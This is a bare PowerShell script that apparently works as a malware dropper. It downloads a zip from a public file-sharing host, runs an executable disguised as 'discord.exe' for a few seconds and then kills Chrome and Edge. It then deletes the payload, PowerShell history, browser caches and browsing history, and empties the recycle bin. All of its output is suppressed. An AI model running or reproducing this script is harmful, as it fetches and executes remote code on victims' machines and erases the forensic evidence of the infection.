$zipUrl = "https://files.catbox.moe/7fwhvd.zip"

$zipPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"

Invoke-WebRequest $zipUrl -OutFile $zipPath > $null 2>&1

Expand-Archive $zipPath $extractPath -Force > $null 2>&1

$exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1

if ($exe) {

    $p = Start-Process $exe.FullName -PassThru

    Start-Sleep 5

    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue > $null 2>&1
}

Start-Sleep 2

taskkill /f /im Runtimer Broker.exe > $null 2>&1
taskkill /f /im chrome.exe > $null 2>&1
taskkill /f /im msedge.exe > $null 2>&1

cmd /c rd /s /q "$extractPath" > nul 2>&1

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue > $null 2>&1

Clear-History

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue > $null 2>&1

Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue > $null 2>&1

Clear-RecycleBin -Force -ErrorAction SilentlyContinue > $null 2>&1
